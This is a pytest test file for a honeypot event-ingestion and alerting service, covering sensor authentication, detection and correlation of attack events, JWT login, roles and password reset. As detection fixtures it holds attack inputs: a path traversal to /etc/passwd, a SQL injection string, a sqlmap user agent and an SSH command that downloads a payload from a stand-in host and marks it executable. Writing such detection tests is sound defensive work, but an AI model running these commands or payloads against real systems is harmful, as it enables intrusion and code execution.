from datetime import UTC, datetime, timedelta

import jwt

from app.core.config import get_settings
from app.main import local_ingestion_requests, settings


SENSOR_HEADERS = {"X-Sensor-Key": "test-sensor-key-at-least-24-characters"}


def test_sensor_authentication_is_required(client):
    response = client.post("/api/v1/ingest/events", json={})
    assert response.status_code == 401


def test_oversized_ingestion_is_rejected(client):
    response = client.post(
        "/api/v1/ingest/events",
        headers={**SENSOR_HEADERS, "Content-Length": "262145"},
        content=b"{}",
    )
    assert response.status_code == 413


def test_http_event_is_persisted_detected_and_correlated(client):
    payload = {
        "event_id": "event-http-0001",
        "timestamp": datetime.now(UTC).isoformat(),
        "source_ip": "192.0.2.55",
        "source_port": 52341,
        "destination_port": 8080,
        "protocol": "HTTP",
        "honeypot": "HTTP",
        "session_id": "session-http-0001",
        "event_type": "HTTP_REQUEST",
        "user_agent": "sqlmap/1.8",
        "payload": {
            "method": "GET",
            "path": "/../../etc/passwd",
            "raw_target": "/..%2f..%2fetc/passwd?id=1%20OR%201=1--",
            "query": {"id": "1 OR 1=1--"},
            "headers": {"user-agent": "sqlmap/1.8"},
            "body_size": 0,
            "response_code": 404,
        },
    }
    response = client.post("/api/v1/ingest/events", headers=SENSOR_HEADERS, json=payload)
    assert response.status_code == 202
    body = response.json()
    assert body["event"]["risk_score"] >= 80
    assert body["event"]["severity"] == "CRITICAL"
    assert body["incident_id"] is not None
    assert body["alert_id"] is not None
    assert {item["attack_type"] for item in body["event"]["detections"]} >= {
        "PATH_TRAVERSAL",
        "SQL_INJECTION",
        "SCANNER",
    }

    duplicate = client.post("/api/v1/ingest/events", headers=SENSOR_HEADERS, json=payload)
    assert duplicate.status_code == 202
    assert duplicate.json()["duplicate"] is True

    payload["event_id"] = "event-http-0002"
    payload["session_id"] = "session-http-0002"
    second = client.post("/api/v1/ingest/events", headers=SENSOR_HEADERS, json=payload)
    assert second.status_code == 202
    assert second.json()["incident_id"] == body["incident_id"]


def test_ssh_sequence_creates_correlated_incident_and_alert(client):
    session_id = "session-ssh-integration"
    incident_id = None
    for index in range(5):
        response = client.post(
            "/api/v1/ingest/events",
            headers=SENSOR_HEADERS,
            json={
                "event_id": f"event-ssh-login-{index}",
                "timestamp": datetime.now(UTC).isoformat(),
                "source_ip": "192.0.2.80",
                "source_port": 50000,
                "destination_port": 2222,
                "protocol": "SSH",
                "honeypot": "SSH",
                "session_id": session_id,
                "event_type": "LOGIN_FAILURE",
                "username": "root",
                "password": "captured-only-for-fingerprint",
                "payload": {"node_name": "ssh-test"},
            },
        )
        assert response.status_code == 202
        incident_id = response.json()["incident_id"] or incident_id
    command = client.post(
        "/api/v1/ingest/events",
        headers=SENSOR_HEADERS,
        json={
            "event_id": "event-ssh-command",
            "timestamp": datetime.now(UTC).isoformat(),
            "source_ip": "192.0.2.80",
            "source_port": 50000,
            "destination_port": 2222,
            "protocol": "SSH",
            "honeypot": "SSH",
            "session_id": session_id,
            "event_type": "COMMAND",
            "username": "root",
            "command": "wget http://example.invalid/payload && chmod +x payload",
            "payload": {"node_name": "ssh-test"},
        },
    )
    assert command.status_code == 202
    assert command.json()["incident_id"] == incident_id
    assert command.json()["alert_id"] is not None
    assert command.json()["event"]["risk_score"] >= 35
    assert "SUSPICIOUS_COMMAND" in {item["attack_type"] for item in command.json()["event"]["detections"]}


def test_register_login_and_protected_management_api(client):
    registered = client.post(
        "/api/v1/auth/register",
        json={"email": "admin@example.com", "password": "a-secure-test-password"},
    )
    assert registered.status_code == 201
    assert registered.json()["role"] == "ADMIN"
    invalid = client.post(
        "/api/v1/auth/login",
        json={"email": "admin@example.com", "password": "wrong"},
    )
    assert invalid.status_code == 401
    login = client.post(
        "/api/v1/auth/login",
        json={"email": "admin@example.com", "password": "a-secure-test-password"},
    )
    assert login.status_code == 200
    token = login.json()["access_token"]
    events = client.get("/api/v1/management/events", headers={"Authorization": f"Bearer {token}"})
    assert events.status_code == 200


def test_role_restriction_and_expired_access_token(client):
    admin = client.post("/api/v1/auth/register", json={"email": "admin@example.com", "password": "a-secure-test-password"})
    assert admin.status_code == 201
    viewer = client.post("/api/v1/auth/register", json={"email": "viewer@example.com", "password": "a-secure-test-password"})
    assert viewer.status_code == 201
    login = client.post("/api/v1/auth/login", json={"email": "viewer@example.com", "password": "a-secure-test-password"})
    token = login.json()["access_token"]
    assert client.get("/api/v1/management/admin/users", headers={"Authorization": f"Bearer {token}"}).status_code == 403

    config = get_settings()
    expired = jwt.encode(
        {"sub": viewer.json()["id"], "role": "VIEWER", "type": "access", "exp": datetime.now(UTC) - timedelta(seconds=1)},
        config.jwt_secret.get_secret_value(),
        algorithm=config.jwt_algorithm,
    )
    assert client.get("/api/v1/management/events", headers={"Authorization": f"Bearer {expired}"}).status_code == 401


def test_refresh_logout_and_password_reset_are_one_time(client, monkeypatch):
    from app.api import auth

    client.post("/api/v1/auth/register", json={"email": "admin@example.com", "password": "original-test-password"})
    login = client.post("/api/v1/auth/login", json={"email": "admin@example.com", "password": "original-test-password"})
    original_refresh = login.json()["refresh_token"]
    replacement = client.post("/api/v1/auth/refresh", json={"refresh_token": original_refresh})
    assert replacement.status_code == 200
    assert client.post("/api/v1/auth/refresh", json={"refresh_token": original_refresh}).status_code == 401
    replacement_refresh = replacement.json()["refresh_token"]
    assert client.post("/api/v1/auth/logout", json={"refresh_token": replacement_refresh}).status_code == 204
    assert client.post("/api/v1/auth/refresh", json={"refresh_token": replacement_refresh}).status_code == 401

    delivered = {}

    class DeliveryResponse:
        def raise_for_status(self):
            return None

    def capture_delivery(_url, *, json, timeout):
        delivered.update(json)
        assert timeout == 3.0
        return DeliveryResponse()

    monkeypatch.setattr(auth.httpx, "post", capture_delivery)
    config = get_settings()
    previous_webhook = config.password_reset_webhook_url
    config.password_reset_webhook_url = "http://reset-delivery.invalid/private"
    try:
        requested = client.post("/api/v1/auth/password-reset/request", json={"email": "admin@example.com"})
    finally:
        config.password_reset_webhook_url = previous_webhook
    assert requested.status_code == 202
    assert delivered["email"] == "admin@example.com"
    new_password = "replacement-test-password"
    confirmed = client.post(
        "/api/v1/auth/password-reset/confirm",
        json={"token": delivered["reset_token"], "password": new_password},
    )
    assert confirmed.status_code == 204
    assert client.post(
        "/api/v1/auth/password-reset/confirm",
        json={"token": delivered["reset_token"], "password": new_password},
    ).status_code == 400
    assert client.post("/api/v1/auth/login", json={"email": "admin@example.com", "password": "original-test-password"}).status_code == 401
    assert client.post("/api/v1/auth/login", json={"email": "admin@example.com", "password": new_password}).status_code == 200


def test_ingestion_rate_limit(client):
    previous = settings.ingestion_rate_limit_per_minute
    settings.ingestion_rate_limit_per_minute = 1
    local_ingestion_requests.clear()
    try:
        first = client.post("/api/v1/ingest/events", headers=SENSOR_HEADERS, json={})
        second = client.post("/api/v1/ingest/events", headers=SENSOR_HEADERS, json={})
        assert first.status_code == 422
        assert second.status_code == 429
    finally:
        settings.ingestion_rate_limit_per_minute = previous
        local_ingestion_requests.clear()
